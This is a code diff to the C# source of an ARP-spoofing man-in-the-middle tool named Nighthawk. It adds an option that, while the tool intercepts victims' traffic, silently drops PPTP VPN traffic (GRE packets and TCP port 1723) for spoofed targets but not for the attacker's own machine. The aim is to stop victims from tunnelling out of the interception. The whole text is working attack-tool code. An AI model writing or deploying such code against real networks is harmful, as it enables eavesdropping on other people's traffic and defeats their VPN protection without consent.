@@ -33,6 +33,7 @@ namespace Nighthawk
         private WinPcapDevice device;
 
         public bool SpoofingStarted;
+        private bool blockPPTP;
 
         // packet queues (packet storage for BG threads)
         public List<ARPPacket> PacketQueue = new List<ARPPacket>();
@@ -60,8 +61,10 @@ namespace Nighthawk
         }
 
         // start ARP spoofing (list of selected targets, gateway)
-        public void StartSpoofing(List<Target> targets1, Target target2)
+        public void StartSpoofing(List<Target> targets1, Target target2, bool blockPPTP)
         {
+            this.blockPPTP = blockPPTP;
+
             SpoofingTargets1 = targets1;
             SpoofingTarget2 = target2;
 
@@ -257,6 +260,22 @@ namespace Nighthawk
                         var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();
 
                         if (destinationMAC == sourceMAC) continue;
+
+
+                        // block PPTP if necessary (exclude local computer)
+                        if (blockPPTP && sourceIP != deviceInfo.IP && destinationIP != deviceInfo.IP)
+                        {
+                            // block GRE
+                            if (ip.Protocol == IPProtocolType.GRE) continue;
+
+                            // check for port 1723 and block it
+                            if (ip.Protocol == IPProtocolType.TCP)
+                            {
+                                var tcp = TcpPacket.GetEncapsulated(packet);
+
+                                if (tcp != null && (tcp.SourcePort == 1723 || tcp.DestinationPort == 1723)) continue;
+                            }
+                        }
                         
                         // incoming packets - change destination MAC back to target's MAC
                         if (IPtoMACTargets1.ContainsKey(destinationIP) && (destinationMAC != IPtoMACTargets1[destinationIP].ToString()))
